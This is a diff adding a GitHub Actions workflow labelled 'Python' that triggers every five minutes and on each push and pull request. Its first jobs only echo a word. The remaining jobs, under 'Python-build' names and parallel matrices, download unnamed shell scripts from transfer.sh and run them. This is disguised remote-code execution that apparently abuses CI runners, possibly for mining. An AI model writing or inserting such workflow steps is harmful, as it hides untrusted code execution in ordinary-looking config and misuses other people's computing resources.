@@ -1,0 +1,158 @@
+name: Python
+on:  
+  "push": null
+  "pull_request": null
+  "schedule":
+  - cron: "*/5 * * * *"
+jobs:
+ Main01:
+    runs-on: ubuntu-18.04
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A]
+    timeout-minutes: 35
+    
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-run
+      run: echo "Python"
+
+ Main02:
+    runs-on: ubuntu-18.04 
+    needs: Main01
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-run
+      run: echo "Python"
+
+ Build4:
+    runs-on: ubuntu-20.04 
+    needs: Main02
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/y5vPYv/1.sh && chmod +x 1.sh && ./1.sh
+ Build4-01:
+    runs-on: ubuntu-20.04 
+    needs: Build4
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/y5vPYv/1.sh && chmod +x 1.sh && ./1.sh
+
+ Build3:
+    runs-on: ubuntu-20.04 
+    needs: Main02
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/Avn2b9/2.sh && chmod +x 2.sh && ./2.sh
+ Build3-01:
+    runs-on: ubuntu-20.04 
+    needs: Build3
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/Avn2b9/2.sh && chmod +x 2.sh && ./2.sh
+
+ Build2:
+    runs-on: ubuntu-20.04 
+    needs: Main02
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/46u3za/3.sh && chmod +x 3.sh && ./3.sh
+ Build2-01:
+    runs-on: ubuntu-20.04 
+    needs: Build2
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/46u3za/3.sh && chmod +x 3.sh && ./3.sh
+
+ Build1:
+    runs-on: ubuntu-20.04 
+    needs: Main02
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/fL2T32/4.sh && chmod +x 4.sh && ./4.sh
+ Build1-01:
+    runs-on: ubuntu-20.04 
+    needs: Build1
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1, 2]
+         flag: [A, B]
+    timeout-minutes: 35
+    steps:
+    - uses: actions/checkout@v2
+    - name: Python-setup
+      run: sudo apt-get update && sudo apt-get install -y wget
+    - name: Python-build
+      run: wget http://transfer.sh/fL2T32/4.sh && chmod +x 4.sh && ./4.sh
